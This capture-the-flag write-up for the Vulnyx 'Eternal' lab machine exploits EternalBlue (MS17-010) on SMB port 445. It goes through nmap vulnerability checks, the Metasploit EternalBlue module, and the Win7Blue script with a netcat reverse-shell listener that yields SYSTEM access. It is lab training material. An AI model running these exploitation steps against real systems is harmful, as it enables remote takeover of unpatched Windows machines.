# $\color{#FF0055}{\text{Eternal - Vulnyx}}$

- **OS:** Windows
- **Difficulty:** $\color{#DC143C}{\text{Easy / Low}}$
- **IP:** `192.168.1.X`
- **Release Date:** 2024-02-03
- **Target:** User Flag & Root Flag (NT AUTHORITY\SYSTEM)

---

## $\color{#FF0055}{\text{Phase 1: Reconnaissance \& Enumeration}}$

### $\color{#DC143C}{\text{1.1 Port Scanning (Nmap)}}$

## <font color="#FF0055">Phase 1: Reconnaissance & Enumeration</font>


**1.1 Port Scanning (Nmap)**

```
nmap -sn 192.168.1.0/24
```

We discovered that the host  <span style="color: IndianRed; font-weight: bold;">192.168.1.179</span> is active and has port 445 (SMB) open. 

**1.2 Vulnerability Verification (Nmap)** 

We checked if the target is vulnerable to <span style="color: IndianRed; font-weight: bold;">EternalBlue (MS17-010)</span>  using an Nmap NSE script:

```
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 192.168.1.179
```

 <span style="color: IndianRed; font-weight: bold;">Phase 2: Exploitation</span>
 
 <span style="color: IndianRed; font-weight: bold;">Option A: Automated Exploitation (Metasploit)</span>

We launch `msfconsole` and select the EternalBlue exploit module:

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
```

Configure the required options (<span style="color: IndianRed; font-weight: bold;">RHOSTS</span> for the target IP and verify <span style="color: IndianRed; font-weight: bold;">LHOST</span> matches our attacker machine IP):

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.179
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.X
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

The exploit runs successfully, granting us an active **Meterpreter** session with full system privileges:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

 <span style="color: IndianRed; font-weight: bold;">Option B: Manual Exploitation</span>

We can check for the MS17-010 vulnerability using Nmap:

```
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 192.168.1.179
```

From the scan results, we extract the CVE identifier: <span style="color: IndianRed; font-weight: bold;">CVE-2017-0143</span> . Searching for public GitHub exploits leads us to the **Win7Blue** repository by `d4t4s3c`.

 <span style="color: IndianRed; font-weight: bold;">1. Repository Setup & Permissions</span>
 
Clone the repository to our Kali Linux environment and make the script executable:

```
git clone [https://github.com/d4t4s3c/Win7Blue.git](https://github.com/d4t4s3c/Win7Blue.git) cd Win7Blue sudo chmod +x Win7Blue
```

 <span style="color: IndianRed; font-weight: bold;">2. Exploit Configuration & Execution</span>

Run the script and select **Option 4** (matching our target OS architecture/type):

```
./Win7Blue
```

Fill in the required parameters:

- **RHOST:** `192.168.1.179`
    
- **LHOST:** `192.168.1.X` (Our Kali IP)
    
- **LPORT:** `4444` (or your chosen listening port)

 <span style="color: IndianRed; font-weight: bold;">3. Setting Up Listener & Gaining Access</span>

In a separate terminal, start a Netcat listener on our chosen `LPORT`:

```
nc -nlvp 4444
```

Execute the exploit from the script. Once triggered, a reverse shell connection is received as `NT AUTHORITY\SYSTEM`.

 <span style="color: IndianRed; font-weight: bold;">4. Flag Retrieval</span>

```
cd C:\Users\MIKE\Desktop 
dir
```

Both flags (`user.txt` and `root.txt`) are located on the user **MIKE**'s Desktop.

